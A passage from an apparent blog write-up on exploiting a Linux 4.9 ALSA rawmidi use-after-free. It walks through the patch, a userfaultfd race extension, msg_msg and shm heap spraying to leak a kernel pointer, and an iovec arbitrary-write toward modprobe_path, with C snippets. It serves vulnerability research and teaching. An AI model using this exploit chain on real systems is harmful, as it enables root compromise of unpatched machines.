</span></span></span><span class=line><span class=cl><span class=gi></span> 
</span></span><span class=line><span class=cl>        spin_lock_irqsave(&amp;runtime-&gt;lock, flags);
</span></span><span class=line><span class=cl><span class=gi>+       snd_rawmidi_buffer_ref(runtime);
</span></span></span><span class=line><span class=cl><span class=gi></span>        while (count &gt; 0 &amp;&amp; runtime-&gt;avail) {
</span></span><span class=line><span class=cl>                count1 = runtime-&gt;buffer_size - runtime-&gt;appl_ptr;
</span></span><span class=line><span class=cl>                if (count1 &gt; count)
</span></span><span class=line><span class=cl><span class=gu>@@ -982,16 +1000,19 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,
</span></span></span><span class=line><span class=cl><span class=gu></span>                if (userbuf) {
</span></span><span class=line><span class=cl>                        spin_unlock_irqrestore(&amp;runtime-&gt;lock, flags);
</span></span><span class=line><span class=cl>                        if (copy_to_user(userbuf + result,
</span></span><span class=line><span class=cl><span class=gd>-                                        runtime-&gt;buffer + appl_ptr, count1)) {
</span></span></span><span class=line><span class=cl><span class=gd>-                               return result &gt; 0 ? result : -EFAULT;
</span></span></span><span class=line><span class=cl><span class=gd>-                       }
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+                                        runtime-&gt;buffer + appl_ptr, count1))
</span></span></span><span class=line><span class=cl><span class=gi>+                               err = -EFAULT;
</span></span></span><span class=line><span class=cl><span class=gi></span>                        spin_lock_irqsave(&amp;runtime-&gt;lock, flags);
</span></span><span class=line><span class=cl><span class=gi>+                       if (err)
</span></span></span><span class=line><span class=cl><span class=gi>+                               goto out;
</span></span></span><span class=line><span class=cl><span class=gi></span>                }
</span></span><span class=line><span class=cl>                result += count1;
</span></span><span class=line><span class=cl>                count -= count1;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl><span class=gi>+ out:
</span></span></span><span class=line><span class=cl><span class=gi>+       snd_rawmidi_buffer_unref(runtime);
</span></span></span><span class=line><span class=cl><span class=gi></span>        spin_unlock_irqrestore(&amp;runtime-&gt;lock, flags);
</span></span><span class=line><span class=cl><span class=gd>-       return result;
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+       return result &gt; 0 ? result : err;
</span></span></span><span class=line><span class=cl><span class=gi></span> }
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> long snd_rawmidi_kernel_read(struct snd_rawmidi_substream *substream,
</span></span><span class=line><span class=cl><span class=gu>@@ -1262,6 +1283,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,
</span></span></span><span class=line><span class=cl><span class=gu></span>                        return -EAGAIN;
</span></span><span class=line><span class=cl>                }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl><span class=gi>+       snd_rawmidi_buffer_ref(runtime);
</span></span></span><span class=line><span class=cl><span class=gi></span>        while (count &gt; 0 &amp;&amp; runtime-&gt;avail &gt; 0) {
</span></span><span class=line><span class=cl>                count1 = runtime-&gt;buffer_size - runtime-&gt;appl_ptr;
</span></span><span class=line><span class=cl>                if (count1 &gt; count)
</span></span><span class=line><span class=cl><span class=gu>@@ -1293,6 +1315,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,
</span></span></span><span class=line><span class=cl><span class=gu></span>        }
</span></span><span class=line><span class=cl>       __end:
</span></span><span class=line><span class=cl>        count1 = runtime-&gt;avail &lt; runtime-&gt;buffer_size;
</span></span><span class=line><span class=cl><span class=gi>+       snd_rawmidi_buffer_unref(runtime);
</span></span></span></code></pre></td></tr></table></div></div><p>Two functions were added:
<a href=https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L112 rel=noopener>snd_rawmidi_buffer_ref</a> and
<a href=https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L117 rel=noopener>snd_rawmidi_buffer_unref</a>. They are respectively used to take and remove a reference to the buffer using <code>snd_rawmidi_runtime->buffer_ref</code> when it is copying (
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957 rel=noopener>snd_rawmidi_kernel_read1</a>) or writing (
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242 rel=noopener>snd_rawmidi_kernel_write1</a>) into that buffer. But why this was needed? Because read and write operations handled by
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242 rel=noopener>snd_rawmidi_kernel_write1</a> and
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957 rel=noopener>snd_rawmidi_kernel_read1</a> temporarly unlock the runtime lock during the copying from/to userspace using <code>spin_unlock_irqrestore</code>[1]/<code>spin_lock_irqrestore</code>[2] giving a small race window where the object can be modified during the <code>copy_from_user</code> call:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>static</span> <span class=kt>long</span> <span class=nf>snd_rawmidi_kernel_write1</span><span class=p>(</span><span class=k>struct</span> <span class=n>snd_rawmidi_substream</span> <span class=o>*</span><span class=n>substream</span><span class=p>,</span> <span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>__user</span> <span class=o>*</span><span class=n>userbuf</span><span class=p>,</span> <span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>kernelbuf</span><span class=p>,</span> <span class=kt>long</span> <span class=n>count</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// [..]
</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=n>spin_unlock_irqrestore</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span> <span class=c1>// [1]
</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=k>if</span> <span class=p>(</span><span class=n>copy_from_user</span><span class=p>(</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>appl_ptr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>					   <span class=n>userbuf</span> <span class=o>+</span> <span class=n>result</span><span class=p>,</span> <span class=n>count1</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>spin_lock_irqsave</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=n>result</span> <span class=o>=</span> <span class=n>result</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>?</span> <span class=nl>result</span> <span class=p>:</span> <span class=o>-</span><span class=n>EFAULT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=k>goto</span> <span class=n>__end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=n>spin_lock_irqsave</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span> <span class=c1>// [2]
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// [..]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>If a concurrent thread re-allocate the <code>runtime->buffer</code> using the <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> ioctl, that thread can lock the object from <code>spin_lock_irq</code> [1] (that has been left unlocked in the small race window given by <code>snd_rawmidi_kernel_write1</code>) and free that buffer[2], making possible to re-allocate an arbitrary object and write on that. Also, the <code>kmalloc</code>[3] in <code>snd_rawmidi_output_params</code> is called with <code>params->buffer_size</code> that is totally user controllable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=err>`</span><span class=n>snd_rawmidi_output_params</span><span class=err>`</span><span class=p>(</span><span class=k>struct</span> <span class=n>snd_rawmidi_substream</span> <span class=o>*</span><span class=n>substream</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			      <span class=k>struct</span> <span class=n>snd_rawmidi_params</span> <span class=o>*</span> <span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// [..]
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>params</span><span class=o>-&gt;</span><span class=n>buffer_size</span> <span class=o>!=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>newbuf</span> <span class=o>=</span> <span class=n>kmalloc</span><span class=p>(</span><span class=n>params</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>,</span> <span class=n>GFP_KERNEL</span><span class=p>);</span> <span class=c1>// [3]
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>newbuf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=o>-</span><span class=n>ENOMEM</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>spin_lock_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span> <span class=c1>// [1]
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>oldbuf</span> <span class=o>=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>=</span> <span class=n>newbuf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer_size</span> <span class=o>=</span> <span class=n>params</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>avail</span> <span class=o>=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>appl_ptr</span> <span class=o>=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>hw_ptr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>spin_unlock_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>kfree</span><span class=p>(</span><span class=n>oldbuf</span><span class=p>);</span> <span class=c1>// [3]
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>// [..]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>What happen if, while a thread is writing into the buffer with <code>copy_from_user</code>, another thread frees that buffer using the <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> ioctl and reallocates a new arbitrary one? The object is replaced with an new one and the <code>copy_from_user</code> will continue writing into another object (the &ldquo;victim object&rdquo;) corrupting its values => User-After-Free (Write).</p><p>The really good part about this vulnerability is the &ldquo;freedom&rdquo; you can have:</p><ul><li>It&rsquo;s possible to call <code>kmalloc</code> with an arbitrary size (and this will be the freed object that we are going to replace to cause a UAF) which means that we can target our favourite slab cache (based on what we need, ofc)</li><li>We can write as much as we want in the buffer with the <code>write</code> syscall</li></ul><a href=#extend-the-race-time-window><h2 id=extend-the-race-time-window><span class=hanchor arialabel=Anchor># </span>Extend the Race Time Window</h2></a><p>We know we have a small race window with few instructions while copying data from userland to kernel as explained before, but the great news is that we have a <code>copy_from_user</code> that can be suspended arbitrarly handling page fault in user-space ! Since I was exploiting the vulnerability in a 4.9 kernel (4.9.223) and hence userfaultd is still not unprivileged as in >5.11, we can still use it to extend our race window and have the necessary time to re-allocate a buffer!</p><a href=#exploitation-plan><h2 id=exploitation-plan><span class=hanchor arialabel=Anchor># </span>Exploitation Plan</h2></a><p>We stated that we are going to use the userfaultd technique to extend the time window. If you are new to this technique is well explained
<a href=https://lwn.net/Articles/819834/ rel=noopener>here</a>, in this
<a href="https://www.youtube.com/watch?v=6dFmH_JEF4s" rel=noopener>video</a> (you can use substitles) and
<a href=https://blog.lizzie.io/using-userfaultfd.html rel=noopener>here</a>. To summarize: you can handle page faults from user-land, temporarly blocking kernel execution while handling the page fault. If we <code>mmap</code> a block of memory with <code>MAP_ANONYMOUS</code> flag, the memory will be demand-zero paged, meaning that it&rsquo;s not yet allocated and we can allocate it via userfaultd.
The idea using this technique is:</p><ul><li>Initialize the <code>runtime->buffer</code> with <code>open</code> => This will allocate the buffer with 4096 size (that will land in <code>kmalloc-4096</code>)</li><li>Send <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> ioctl command in order to re-allocate the buffer with our desired size (e.g. 30 wil land in <code>kmalloc-32</code>)</li><li>Allocate with <code>mmap</code> a demand-zero paged (<code>MAP_ANON</code>) and initialize <code>userfaultd</code> to handle its page fault</li><li><code>write</code> to the rawmidi file descriptor using our previously allocated mmaped memory => This will trigger the userland page fault in <code>copy_from_user</code></li><li>While the kernel thread is suspended waiting for the userland page fault we can send again the <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> in order to free the current <code>runtime->buffer</code></li><li>We allocate an object in, for example, <code>kmalloc-32</code> and if we did some spray before on that cache it will take the place of the previous freed <code>runtime->buffer</code></li><li>We release the page fault from userland and the <code>copy_from_user</code> will continue writing its data (totally in user control) to the new allocated object</li></ul><p>With this primitive, we can forges arbitrary objects with <strong>arbitrary size</strong> (specified in the <code>write</code> syscall), <strong>arbitrary content</strong>, <strong>arbitrary offset</strong> (since we can trigger userfaultd between two pages as demostrated later on) and <strong>arbitrary cache</strong> (we can control the size allocation in the <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> ioctl).
As you can deduce, we have a really great and powerful primitive !</p><a href=#information-leak><h2 id=information-leak><span class=hanchor arialabel=Anchor># </span>Information Leak</h2></a><a href=#victim-object><h3 id=victim-object><span class=hanchor arialabel=Anchor># </span>Victim Object</h3></a><p>We are going to use what we previously explained in the &ldquo;Exploitation Plan&rdquo; section to leak an address that we will re-use to have an arbitrary write. Since we can choose which cache trigger the UAF on (and that&rsquo;s gold from an exploitation point of view) I choose to leak the <code>shm_file_data->ns</code> pointer that points to <code>init_ipc_ns</code> in the kernel <code>.data</code> section and it lives in <code>kmalloc-32</code> (I also used the same function to spray the <code>kmalloc-32</code> cache):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>alloc_shm</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>shmid</span><span class=p>[</span><span class=mh>0x100</span><span class=p>]</span>     <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>shmaddr</span><span class=p>[</span><span class=mh>0x100</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>shmid</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>shmget</span><span class=p>(</span><span class=n>IPC_PRIVATE</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>IPC_CREAT</span> <span class=o>|</span> <span class=mo>0600</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>shmid</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>  <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=n>errExit</span><span class=p>(</span><span class=s>&#34;shmget&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>shmaddr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>shmat</span><span class=p>(</span><span class=n>shmid</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>SHM_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>shmaddr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=n>errExit</span><span class=p>(</span><span class=s>&#34;shmat&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>alloc_shm</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>From that pointer, we will deduce the pointer of <code>modprobe_path</code> in order to use that technique later to elevate our privileges.</p><a href=#msg_msg><h3 id=msg_msg><span class=hanchor arialabel=Anchor># </span>msg_msg</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>msg_msg</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>list_head</span> <span class=n>m_list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=n>m_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>m_ts</span><span class=p>;</span>		<span class=cm>/* message text size */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>msg_msgseg</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>security</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* the actual message follows immediately */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>msg_msgseg</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>msg_msgseg</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* the next part of the message follows immediately */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>In order to leak that address, however, we have to compromise some other object in <code>kmalloc-32</code>, maybe a length field that would read after its own object. For that case, <code>msg_msg</code> is our perfect match because it has a length field specified in its <code>msg_msg->m_ts</code> and it can be allocated in almost any cache starting from <code>kmalloc-32</code> to <code>kmalloc-4096</code>, with just one downside: The minimun allocation for the <code>msg_msg</code> struct is 48 (<code>sizeof(struct msg_msg)</code>) and it can lands minimun at <code>kmalloc-64</code>.
If you want to read more about this structure you can checkout
<a href=https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html rel=noopener>Fire of Salvation Writeup</a>,
<a href=https://syst3mfailure.io/wall-of-perdition rel=noopener>Wall Of Perdition</a> and the
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msg.c rel=noopener>kernel source code</a>.
However, when a message is sent using <code>msgsnd</code> with size more than
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msgutil.c#L46 rel=noopener>DATALEN_MSG</a> (<code>((size_t)PAGE_SIZE-sizeof(struct msg_msg))</code>) that is 4096-48, a segment (or multiple segments if needed) is allocated, and the message is splitted between the <code>msg_msg</code> (the payload is just after the struct headers) and the <code>msg_msgseg</code>, with the total size of the message specified in <code>msg_msg->m_ts</code>.</p><p>In order to allocate our target object in <code>kmalloc-32</code> we have to send a message with size: ( ( 4096 - 48 ) + 10 ).</p><ul><li>The <code>msg_msg</code> structure will be allocated in <code>kmalloc-4096</code> and the first (4096 - 48) bytes will be written in the <code>msg_msg</code> structure.</li><li>To allocate the remaining 10 bytes, a segment <code>msg_msgseg</code> will be allocated in <code>kmalloc-32</code></li></ul><p>With these conditions, we can forge the <code>msg_msg</code> structure in <code>kmalloc-4096</code> overwriting its <code>m_ts</code> value with our UAF and with <code>msgrcv</code> we can receive a message that will contains values past our segment allocated in <code>kmalloc-32</code> (including our targeted <code>init_ipc_ns</code> pointer).</p><a href=#dealing-with-offsets><h4 id=dealing-with-offsets><span class=hanchor arialabel=Anchor># </span>Dealing with offsets</h4></a><p>However, we want to overwrite the <code>m_ts</code> value without overwriting anything else in the <code>msg_msg</code> structure, how we can do that?
If you remember, I said we can overwrite chunks with arbitrary size, content and <strong>offset</strong>. If we create a <code>mmap</code> memory with size <code>PAGE_SIZE * 2</code> (two pages) and we handle the page fault only for the second page, we can start writing into the original <code>runtime->buffer</code> and trigger the page fault when it receives the <code>msg_msg->m_ts</code> offset (0x18). Now that the kernel thread is blocked, it&rsquo;s possible to replace the object with <code>msg_msg</code> and when the <code>copy_from_user</code> resumes, it will starts writing exactly at the <code>msg_msg->m_ts</code> value the remaining bytes. The size we are writing into the file descriptor is (0x18 + 0x2) since the first 0x18 bytes will be used to land at the exact offset and the 2 remaining bytes will write <code>0xffff</code> in <code>msg_msg->m_ts</code>. The concept is also explained in the following picture:</p><p><img src=/2.png width=auto></p><p>Now from the received message from <code>msgrcv</code> we can retrieve the <code>init_ipc_ns</code> pointer from <code>shm_file_data</code> and we can deduce the <code>modprobe_path</code> address calculating its offset and proceed with the arbitrary write phase.</p><a href=#arbitrary-write><h2 id=arbitrary-write><span class=hanchor arialabel=Anchor># </span>Arbitrary Write</h2></a><p>In order to write at arbitrary locations we are using the same userfault technique described above but instead of targeting <code>msg_msg</code> we will use the Vectored I/O (<code>pipe</code> + <code>iovec</code>) primitive. This primitive has been fixed in kernel 4.13 with
<a href=https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L142 rel=noopener>copyin</a> and
<a href=https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L133 rel=noopener>copyout</a> wrappers, with an <code>access_ok</code> addition. This technique has been widely used exploiting the Android Binder CVE-2019-2215 and is well detailed
<a href=https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html rel=noopener>here</a> and
<a href=https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer rel=noopener>here</a>.</p><p>The idea is to trigger the UAF once again but targeting the
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/include/uapi/linux/uio.h#L16 rel=noopener>iovec</a> struct:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>iovec</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=n>__user</span> <span class=o>*</span><span class=n>iov_base</span><span class=p>;</span>	<span class=cm>/* BSD uses caddr_t (1003.1g requires void *) */</span>
</span></span><span class=line><span class=cl>	<span class=n>__kernel_size_t</span> <span class=n>iov_len</span><span class=p>;</span> <span class=cm>/* Must be size_t (1003.1g) */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>The
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/fs/read_write.c#L792 rel=noopener>minimun allocation</a> for <code>iovec</code> occurs with <code>sizeof(struct iovec) * 9</code> or <code>16 * 9</code> (144) that will land at <code>kmalloc-192</code> (otherwise it is stored in the stack). However I choose to allocate 13 vectors using <code>readv</code> to make the object land in <code>kmalloc-256</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>pipefd</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>pipe</span><span class=p>(</span><span class=n>pipefd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>// [...]
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>iovec</span> <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>read_buffer0</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>memset</span><span class=p>(</span><span class=n>read_buffer0</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>read_buffer0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>iov_len</span><span class=o>=</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>read_buffer0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span><span class=o>=</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>8</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>read_buffer0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>8</span><span class=p>].</span><span class=n>iov_len</span><span class=o>=</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>12</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>read_buffer0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iov_read_buffers</span><span class=p>[</span><span class=mi>12</span><span class=p>].</span><span class=n>iov_len</span><span class=o>=</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>fork</span><span class=p>()){</span>
